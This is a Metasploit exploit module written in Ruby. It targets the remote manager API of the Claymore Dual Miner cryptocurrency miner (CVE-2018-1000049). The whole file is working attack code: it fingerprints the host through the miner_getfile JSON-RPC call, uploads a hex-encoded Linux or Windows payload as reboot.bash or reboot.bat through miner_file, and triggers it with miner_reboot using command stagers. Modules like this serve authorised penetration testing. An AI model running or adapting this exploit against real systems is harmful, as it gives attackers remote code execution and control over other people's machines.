# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/powershell&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Nanopool Claymore Dual Miner APIs RCE&#039;,
      &#039;Description&#039;     => %q{
        This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability.
      },
      &#039;Author&#039;          =>
        [
          &#039;reversebrain@snado&#039;, # Vulnerability reporter
          &#039;phra@snado&#039;          # Metasploit module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [&#039;EDB&#039;, &#039;44638&#039;],
          [&#039;CVE&#039;, &#039;2018-1000049&#039;],
          [&#039;URL&#039;, &#039;https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/&#039;]
        ],
      &#039;Platform&#039;        => [&#039;win&#039;, &#039;linux&#039;],
      &#039;Targets&#039;         =>
        [
          [ &#039;Automatic Target&#039;, { &#039;auto&#039; => true }],
          [ &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X64,
              &#039;CmdStagerFlavor&#039; => [ &#039;bourne&#039;, &#039;echo&#039;, &#039;printf&#039; ]
            }
          ],
          [ &#039;Windows&#039;,
            {
              &#039;Platform&#039; => &#039;windows&#039;,
              &#039;Arch&#039; => ARCH_X64,
              &#039;CmdStagerFlavor&#039; => [ &#039;certutil&#039;, &#039;vbs&#039; ]
            }
          ]
        ],
      &#039;Payload&#039; =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DisclosureDate&#039;  => &#039;Feb 09 2018&#039;,
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptPort.new(&#039;RPORT&#039;, [ true, &#039;Set miner port&#039;, 3333 ])
      ])
    deregister_options(&#039;URIPATH&#039;, &#039;SSL&#039;, &#039;SSLCert&#039;, &#039;SRVPORT&#039;, &#039;SRVHOST&#039;)
  end

  def select_target
    data = {
      "id"      => 0,
      "jsonrpc" => &#039;2.0&#039;,
      "method"  => &#039;miner_getfile&#039;,
      "params"  => [&#039;config.txt&#039;]
    }.to_json
    connect
    sock.put(data)
    buf = sock.get_once || &#039;&#039;
    tmp = StringIO.new
    tmp << buf
    tmp2 = tmp.string
    hex = &#039;&#039;
    if tmp2.scan(/\w+/)[7]
      return self.targets[2]
    elsif tmp2.scan(/\w+/)[5]
      return self.targets[1]
    else
      return nil
    end
  end

  def check
    target = select_target
    if target.nil?
      return Exploit::CheckCode::Safe
    end
    data = {
      "id"      => 0,
      "jsonrpc" => &#039;2.0&#039;,
      "method"  => &#039;miner_getfile&#039;,
      "params"  => [&#039;config.txt&#039;]
    }.to_json
    connect
    sock.put(data)
    buf = sock.get_once || &#039;&#039;
    tmp = StringIO.new
    tmp << buf
    tmp2 = tmp.string
    hex = &#039;&#039;
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      hex = tmp2.scan(/\w+/)[5]
    when &#039;windows&#039;
      hex = tmp2.scan(/\w+/)[7]
    end
    str = Rex::Text.hex_to_raw(hex)
    if str.include?(&#039;WARNING&#039;)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Detected
    end
  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
    vprint_error(e.message)
    return Exploit::CheckCode::Unknown
  ensure
    disconnect
  end

  def execute_command(cmd, opts = {})
    target = select_target
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      cmd = Rex::Text.to_hex(cmd, &#039;&#039;)
      upload = {
        "id"      => 0,
        "jsonrpc" => &#039;2.0&#039;,
        "method"  => &#039;miner_file&#039;,
        "params"  => [&#039;reboot.bash&#039;, "#{cmd}"]
      }.to_json
    when &#039;windows&#039;
      cmd = Rex::Text.to_hex(cmd_psh_payload(payload.encoded, payload_instance.arch.first), &#039;&#039;)
      upload = {
        "id"      => 0,
        "jsonrpc" => &#039;2.0&#039;,
        "method"  => &#039;miner_file&#039;,
        "params"  => [&#039;reboot.bat&#039;, "#{cmd}"]
      }.to_json
    end

    connect
    sock.put(upload)
    buf = sock.get_once || &#039;&#039;
    trigger_vulnerability
  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
    fail_with(Failure::UnexpectedReply, e.message)
  ensure
    disconnect
  end

  def trigger_vulnerability
    execute = {
      "id"      => 0,
      "jsonrpc" => &#039;2.0&#039;,
      "method"  => &#039;miner_reboot&#039;
    }.to_json
    connect
    sock.put(execute)
    buf = sock.get_once || &#039;&#039;
    disconnect
  end

  def exploit
    target = select_target
    if target.nil?
      fail_with(Failure::NoTarget, &#039;No matching target&#039;)
    end
    if (target[&#039;Platform&#039;].eql?(&#039;linux&#039;) && payload_instance.name !~ /linux/i) ||
      (target[&#039;Platform&#039;].eql?(&#039;windows&#039;) && payload_instance.name !~ /windows/i)
      fail_with(Failure::BadConfig, "Selected payload &#039;#{payload_instance.name}&#039; is not compatible with target operating system &#039;#{target.name}&#039;")
    end
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      execute_cmdstager(flavor: :echo, linemax: 100000)
    when &#039;windows&#039;
      execute_cmdstager(flavor: :vbs, linemax: 100000)
    end
  end
end

